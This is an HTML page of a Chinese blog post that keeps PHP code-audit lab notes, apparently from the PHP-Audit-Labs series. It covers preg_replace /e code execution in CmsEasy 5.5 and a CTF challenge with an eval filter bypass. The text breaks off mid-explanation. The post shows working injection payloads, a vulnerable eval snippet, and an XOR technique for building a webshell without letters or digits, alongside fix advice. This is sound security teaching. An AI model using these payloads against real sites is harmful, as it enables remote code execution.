<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="系列内容均来自：https:&#x2F;&#x2F;github.com&#x2F;hongriSec&#x2F;PHP-Audit-Labs&#x2F;，仅仅在笔记中保存 Day8 - Candle题目叫蜡烛，代码如下   preg_replace：(PHP 5.5) 功能 ： 函数执行一个正则表达式的搜索和替换 定义 ： mixed preg_replace ( mixed $pattern , mixed $replacement , mi">
<meta property="og:type" content="article">
<meta property="og:title" content="【代码审计】PHP代码审计3">
<meta property="og:url" content="https://g0dam.github.io/2024/10/14/WebSecurity/codeaudit/phpaudit3/index.html">
<meta property="og:site_name" content="g0dam">
<meta property="og:description" content="系列内容均来自：https:&#x2F;&#x2F;github.com&#x2F;hongriSec&#x2F;PHP-Audit-Labs&#x2F;，仅仅在笔记中保存 Day8 - Candle题目叫蜡烛，代码如下   preg_replace：(PHP 5.5) 功能 ： 函数执行一个正则表达式的搜索和替换 定义 ： mixed preg_replace ( mixed $pattern , mixed $replacement , mi">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://g0dam.github.io/2024/10/14/WebSecurity/codeaudit/phpaudit3/image.png">
<meta property="og:image" content="https://g0dam.github.io/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-1.png">
<meta property="og:image" content="https://g0dam.github.io/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-2.png">
<meta property="og:image" content="https://g0dam.github.io/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-3.png">
<meta property="og:image" content="https://g0dam.github.io/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-4.png">
<meta property="og:image" content="https://g0dam.github.io/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-5.png">
<meta property="og:image" content="https://g0dam.github.io/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-6.png">
<meta property="og:image" content="https://g0dam.github.io/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-7.png">
<meta property="og:image" content="https://g0dam.github.io/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-8.png">
<meta property="og:image" content="https://g0dam.github.io/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-9.png">
<meta property="og:image" content="https://g0dam.github.io/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-10.png">
<meta property="og:image" content="https://g0dam.github.io/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-11.png">
<meta property="og:image" content="https://g0dam.github.io/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-12.png">
<meta property="og:image" content="https://g0dam.github.io/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-13.png">
<meta property="og:image" content="https://g0dam.github.io/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-14.png">
<meta property="og:image" content="https://g0dam.github.io/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-15.png">
<meta property="og:image" content="https://g0dam.github.io/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-16.png">
<meta property="og:image" content="https://g0dam.github.io/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-17.png">
<meta property="og:image" content="https://g0dam.github.io/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-18.png">
<meta property="og:image" content="https://g0dam.github.io/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-19.png">
<meta property="og:image" content="https://g0dam.github.io/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-20.png">
<meta property="og:image" content="https://g0dam.github.io/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-21.png">
<meta property="article:published_time" content="2024-10-14T04:46:15.000Z">
<meta property="article:modified_time" content="2024-10-14T07:22:04.359Z">
<meta property="article:author" content="g0dam">
<meta property="article:tag" content="代码审计">
<meta property="article:tag" content="PHP">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://g0dam.github.io/2024/10/14/WebSecurity/codeaudit/phpaudit3/image.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>【代码审计】PHP代码审计3</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
      <link rel="alternate" href="/true" title="g0dam" type="application/atom+xml" />
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/categories/">Categories</a></li><!--
     --><!--
       --><li><a href="/idea/">Idea</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/g0dam">Projects</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2024/10/15/WebSecurity/framwork/waf/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2024/10/11/WebSecurity/framwork/webarchitecture/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://g0dam.github.io/2024/10/14/WebSecurity/codeaudit/phpaudit3/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://g0dam.github.io/2024/10/14/WebSecurity/codeaudit/phpaudit3/&text=【代码审计】PHP代码审计3"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://g0dam.github.io/2024/10/14/WebSecurity/codeaudit/phpaudit3/&title=【代码审计】PHP代码审计3"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://g0dam.github.io/2024/10/14/WebSecurity/codeaudit/phpaudit3/&is_video=false&description=【代码审计】PHP代码审计3"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=【代码审计】PHP代码审计3&body=Check out this article: https://g0dam.github.io/2024/10/14/WebSecurity/codeaudit/phpaudit3/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://g0dam.github.io/2024/10/14/WebSecurity/codeaudit/phpaudit3/&title=【代码审计】PHP代码审计3"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://g0dam.github.io/2024/10/14/WebSecurity/codeaudit/phpaudit3/&title=【代码审计】PHP代码审计3"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://g0dam.github.io/2024/10/14/WebSecurity/codeaudit/phpaudit3/&title=【代码审计】PHP代码审计3"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://g0dam.github.io/2024/10/14/WebSecurity/codeaudit/phpaudit3/&title=【代码审计】PHP代码审计3"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://g0dam.github.io/2024/10/14/WebSecurity/codeaudit/phpaudit3/&name=【代码审计】PHP代码审计3&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://g0dam.github.io/2024/10/14/WebSecurity/codeaudit/phpaudit3/&t=【代码审计】PHP代码审计3"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Day8-Candle"><span class="toc-number">1.</span> <span class="toc-text">Day8 - Candle</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90"><span class="toc-number">1.1.</span> <span class="toc-text">实例分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞验证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88"><span class="toc-number">1.3.</span> <span class="toc-text">修复方案</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-number">1.4.</span> <span class="toc-text">题目</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day9-Rabbit"><span class="toc-number">2.</span> <span class="toc-text">Day9 Rabbit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day10-Anticipation"><span class="toc-number">3.</span> <span class="toc-text">Day10 Anticipation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90-1"><span class="toc-number">3.1.</span> <span class="toc-text">实例分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#FengCms-1-32-%E7%BD%91%E7%AB%99%E9%87%8D%E8%A3%85%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.1.1.</span> <span class="toc-text">FengCms 1.32 网站重装漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Simple-Log1-6%E7%BD%91%E7%AB%99%E9%87%8D%E8%A3%85%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.1.2.</span> <span class="toc-text">Simple-Log1.6网站重装漏洞</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE-1"><span class="toc-number">3.2.</span> <span class="toc-text">题目</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day-11-Pumpkin-Pie"><span class="toc-number">4.</span> <span class="toc-text">Day 11 - Pumpkin Pie</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90-2"><span class="toc-number">4.1.</span> <span class="toc-text">实例分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="toc-number">4.2.</span> <span class="toc-text">修复建议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE-2"><span class="toc-number">4.3.</span> <span class="toc-text">题目</span></a></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        【代码审计】PHP代码审计3
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">g0dam</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2024-10-14T04:46:15.000Z" class="dt-published" itemprop="datePublished">2024-10-14</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/Web-Security/">Web Security</a>
    </div>


      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/PHP/" rel="tag">PHP</a>, <a class="p-category" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <p>系列内容均来自：<a target="_blank" rel="noopener" href="https://github.com/hongriSec/PHP-Audit-Labs/%EF%BC%8C%E4%BB%85%E4%BB%85%E5%9C%A8%E7%AC%94%E8%AE%B0%E4%B8%AD%E4%BF%9D%E5%AD%98">https://github.com/hongriSec/PHP-Audit-Labs/，仅仅在笔记中保存</a></p>
<h2 id="Day8-Candle"><a href="#Day8-Candle" class="headerlink" title="Day8 - Candle"></a>Day8 - Candle</h2><p>题目叫蜡烛，代码如下</p>
<p><img src="/2024/10/14/WebSecurity/codeaudit/phpaudit3/image.png"></p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://php.net/manual/zh/function.preg-replace.php"><strong>preg_replace</strong></a>：(PHP 5.5)</p>
<p><strong>功能</strong> ： 函数执行一个正则表达式的搜索和替换</p>
<p><strong>定义</strong> ： <code>mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )</code></p>
<p>搜索 <strong>subject</strong> 中匹配 <strong>pattern</strong> 的部分， 如果匹配成功以 <strong>replacement</strong> 进行替换</p>
</blockquote>
<ul>
<li><strong>$pattern</strong> 存在 <strong>&#x2F;e</strong> 模式修正符，允许代码执行</li>
<li><strong>&#x2F;e</strong> 模式修正符，是 **preg_replace() ** 将 <strong>$replacement</strong> 当做php代码来执行</li>
</ul>
<p><strong>漏洞解析</strong> </p>
<p>这道题目考察的是 <strong>preg_replace</strong> 函数使用 <strong>&#x2F;e</strong> 模式，导致代码执行的问题。我们发现在上图代码 <strong>第11行</strong> 处，将 <strong>GET</strong> 请求方式传来的参数用在了 <strong>complexStrtolower</strong> 函数中，而变量 <strong>$regex</strong> 和 <strong>$value</strong> 又用在了存在代码执行模式的 <strong>preg_replace</strong> 函数中。所以，我们可以通过控制 <strong>preg_replace</strong> 函数第1个、第3个参数，来执行代码。但是可被当做代码执行的第2个参数，却固定为 <strong>‘strtolower(“\\1”)’</strong> 。实际上，这里涉及到正则表达式反向引用的知识，即此处的 <strong>\\1</strong> ，大家可以参考 <a target="_blank" rel="noopener" href="https://www.w3cschool.cn/zhengzebiaodashi/regexp-syntax.html"><strong>W3Cschool</strong></a> 上的解释：</p>
<blockquote>
<p><strong>反向引用</strong> </p>
<p>对一个正则表达式模式或部分模式 <strong>两边添加圆括号</strong> 将导致相关 <strong>匹配存储到一个临时缓冲区</strong> 中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 ‘\n’ 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。</p>
</blockquote>
<p>本题官方给的 <strong>payload</strong> ：**&#x2F;?.<em>&#x3D;{${phpinfo()}}</em>* 实际上并不能用，因为如果GET请求的参数名存在非法字符，PHP会将其替换成下划线，即 <code>.*</code> 会变成 <code>_*</code> 。这里我们提供一个可用 <strong>payload</strong> ：<em><em>\S</em>&#x3D;${phpinfo()}</em>* ，详细分析请参考我们前几天发表的文章： <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2557">深入研究preg_replace与代码执行</a><br><img src="/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-1.png"></p>
<p>在新版本中特别注意<code>/e</code>修饰符已经被废弃，建议使用<code>preg_replace_callback()</code>来安全地实现相同的功能。</p>
<h3 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h3><p>本次实例分析，我们选取的是 <strong>CmsEasy 5.5</strong> 版本，漏洞入口文件为 <strong>&#x2F;lib&#x2F;tool&#x2F;form.php</strong> ，我们可以看到下图第7行处引用了<strong>preg_replace</strong> ，且使用了 <strong>&#x2F;e</strong> 模式。如果 <code>$form[$name][&#39;default&#39;]</code> 的内容被正则匹配到，就会执行 <strong>eval</strong> 函数，导致代码执行。具体代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>  <span class="function"><span class="keyword">function</span> <span class="title">getform</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$form</span>, <span class="variable">$field</span>, <span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line"><span class="number">2</span>      <span class="keyword">if</span> (<span class="title function_ invoke__">get</span>(<span class="string">&#x27;table&#x27;</span>) &amp;&amp; <span class="keyword">isset</span>(setting::<span class="variable">$var</span>[<span class="title function_ invoke__">get</span>(<span class="string">&#x27;table&#x27;</span>)][<span class="variable">$name</span>]))</span><br><span class="line"><span class="number">3</span>          <span class="variable">$form</span>[<span class="variable">$name</span>] = setting::<span class="variable">$var</span>[<span class="title function_ invoke__">get</span>(<span class="string">&#x27;table&#x27;</span>)][<span class="variable">$name</span>];</span><br><span class="line"><span class="number">4</span>      <span class="keyword">if</span> (<span class="title function_ invoke__">get</span>(<span class="string">&#x27;form&#x27;</span>) &amp;&amp; <span class="keyword">isset</span>(setting::<span class="variable">$var</span>[<span class="title function_ invoke__">get</span>(<span class="string">&#x27;form&#x27;</span>)][<span class="variable">$name</span>]))</span><br><span class="line"><span class="number">5</span>          <span class="variable">$form</span>[<span class="variable">$name</span>] = setting::<span class="variable">$var</span>[<span class="title function_ invoke__">get</span>(<span class="string">&#x27;form&#x27;</span>)][<span class="variable">$name</span>];</span><br><span class="line"><span class="number">6</span>      <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$form</span>[<span class="variable">$name</span>][<span class="string">&#x27;default&#x27;</span>]))</span><br><span class="line"><span class="number">7</span>          <span class="variable">$form</span>[<span class="variable">$name</span>][<span class="string">&#x27;default&#x27;</span>] = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/\&#123;\?([^\&#125;]+)\&#125;/e&#x27;</span>, <span class="string">&quot;eval(&#x27;return <span class="subst">$1</span>;&#x27;)&quot;</span>, <span class="variable">$form</span>[<span class="variable">$name</span>][<span class="string">&#x27;default&#x27;</span>]);</span><br><span class="line"><span class="number">8</span>      <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$data</span>[<span class="variable">$name</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$form</span>[<span class="variable">$name</span>][<span class="string">&#x27;default&#x27;</span>]))</span><br><span class="line"><span class="number">9</span>          <span class="variable">$data</span>[<span class="variable">$name</span>] = <span class="variable">$form</span>[<span class="variable">$name</span>][<span class="string">&#x27;default&#x27;</span>];</span><br><span class="line"><span class="number">10</span>     <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/templat/&#x27;</span>, <span class="variable">$name</span>) &amp;&amp; <span class="keyword">empty</span>(<span class="variable">$data</span>[<span class="variable">$name</span>]))</span><br><span class="line"><span class="number">11</span>         <span class="variable">$data</span>[<span class="variable">$name</span>] = <span class="variable">$form</span>[<span class="variable">$name</span>][<span class="string">&#x27;default&#x27;</span>];</span><br></pre></td></tr></table></figure>

<p>我们再来看看这个 <strong>getform()</strong> 函数在何处被引用。通过搜索，我们可以发现在 <strong>Cache&#x2F;template&#x2F;default&#x2F;manage&#x2F;guestadd.php</strong> 程序中，调用了此函数。这里我们需要关注 <strong>catid</strong> (下图 <strong>第4行</strong> 代码)，因为 <strong>catid</strong> 作为 <strong>$name</strong> 在 <strong>preg_preolace()</strong> 函数中使用到，这是我们成功利用漏洞的关键。 <strong>guestadd.php</strong> 中的关键代码如下：</p>
<p><img src="/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-2.png"></p>
<p>那么问题来了， <strong>catid</strong> 是在何处定义的，或者说与什么有关？通过搜索，我们发现 <strong>lib&#x2F;table&#x2F;archive.php</strong> 文件中的 <strong>get_form()</strong> 函数对其进行了定义。如下图所示，我们可以看到该函数 <strong>return</strong> 了一个数组，数组里包含了<strong>catid</strong> 、 <strong>typeid</strong> 等参数对应的内容。仔细查看，发现其中又嵌套着一个数组。在 <strong>第6行处</strong> 发现了 <strong>default</strong> 字段，这个就是我们上面提到的 <code>$form[$name][&#39;default&#39;]</code> 。</p>
<p><img src="/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-3.png"></p>
<p>而上图 <strong>第6行</strong> 的 <strong>get()</strong> 方法在 <strong>lib&#x2F;tool&#x2F;front_class.php</strong> 中，它是程序内部封装的一个方法。可以看到根据用户的请求方式， <strong>get()</strong> 方法会调用 <strong>front</strong> 类相应的 <strong>get</strong> 方法或 <strong>post</strong> 方法，具体代码如下：</p>
<p><img src="/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-4.png"></p>
<p> <strong>front</strong> 类的 <strong>get</strong> 方法和 <strong>post</strong> 方法如下，看到其分别对应静态数组</p>
<p><img src="/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-5.png"></p>
<p>继续跟进静态方法 <strong>get</strong> 和 <strong>post</strong> ，可以看到在 <strong>front</strong> 类中定义的静态属性</p>
<p><img src="/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-6.png"></p>
<p>这就意味着前面说的 <code>$form[$name][&#39;default&#39;]</code> 中 <strong>name</strong> 和 <strong>default</strong> 的内容，都是我们可以控制的。</p>
<p>我们屡一下思路，<strong>get_form</strong> 函数定义了 <strong>catid</strong> 的值， <strong>catid</strong> 对应的 <strong>default</strong> 字段又存在代码执行漏洞。而 <strong>catid</strong> 的值由 <strong>get(‘catid’)</strong> 决定，这个 <strong>get(‘catid’)</strong> 又是用户可以控制的。所以我们现在只要找到调用 <strong>get_form</strong> 函数的地方，即可触发该漏洞。通过搜索，我们发现在 <strong>&#x2F;lib&#x2F;default&#x2F;manage_act.php</strong> 文件的第10行调用了 <strong>get_form()</strong> 函数，通过 <strong>View</strong> 模板直接渲染到前台显示：</p>
<p><img src="/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-7.png"><br>这就形成了这套程序整体的一个执行流程，如下图所示：</p>
<p><img src="/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-8.png"></p>
<h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>1、首先打开首页，点击游客投稿</p>
<p><img src="/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-9.png"></p>
<p>2、进入到相应的页面，传给catid值，让他匹配到 <code>/\&#123;\?([^&#125;]+)\&#125;/e</code> 这一内容，正则匹配的内容也就是 <code>&#123;?(任意内容)&#125;</code> ，所以我们可以构造payload： <strong>catid&#x3D;{?(phpinfo())}</strong> </p>
<h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><p>漏洞是 <strong>preg_replace()</strong> 存在 <strong>&#x2F;e</strong> 模式修正符，如果正则匹配成功，会造成代码执行漏洞，因此为了避免这样的问题，我们避免使用 <strong>&#x2F;e</strong> 模式修正符，如下图第7行：<br><img src="/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-10.png"></p>
<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Long.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__FILE);</span><br><span class="line"><span class="comment">// $hint = &quot;php function getFlag() to get flag&quot;;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>Day8</strong> 的题目来自8月份 <strong>金融业网络安全攻防比赛</strong> ，写题解的时候发现 <strong>信安之路</strong> 已经写了很好的题解，具体可以点 <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/fCxs4hAVpa-sF4tdT_W8-w">这里</a> ，所以接下来我只会提及关键部分。</p>
<p>这道题目实际上是考察不包含字母数字的webshell利用，大家可以参考 <strong>phithon</strong> 师傅的文章：<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">一些不包含数字和字母的webshell</a> ，我们只需要构造并调用 <strong>getFlag</strong> 函数即可获得flag。排除这里正则的限制，正常的想法payload应该类似这样（把上图代码中的正则匹配注释掉进行测试）：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">index.php?code=<span class="title function_ invoke__">getFlag</span>();</span><br><span class="line">index.php?code=<span class="variable">$_GET</span>[_]();&amp;_=getFlag</span><br></pre></td></tr></table></figure>

<p>我们现在再来考虑考虑如何绕过这里的正则。游戏规则很简单，要求我们传入的 <strong>code</strong> 参数不能存在字母及数字，这就很容易想到 <strong>phithon</strong> 师傅的 <a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">一些不包含数字和字母的webshell</a> 一文。通过异或 <strong>^</strong> 运算、取反 <strong>~</strong> 运算，构造出我们想要的字符就行。这里我们直接看 <strong>payload</strong> ：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=<span class="variable">$_</span>=<span class="string">&quot;`&#123;&#123;&#123;&quot;</span>^<span class="string">&quot;?&lt;&gt;/&quot;</span>;$&#123;<span class="variable">$_</span>&#125;[_]($&#123;<span class="variable">$_</span>&#125;[__]);&amp;_=getFlag</span><br></pre></td></tr></table></figure>

<p>我们来拆解分析一下 <strong>payload</strong> ，<strong>eval</strong> 函数会执行如下字符串：</p>
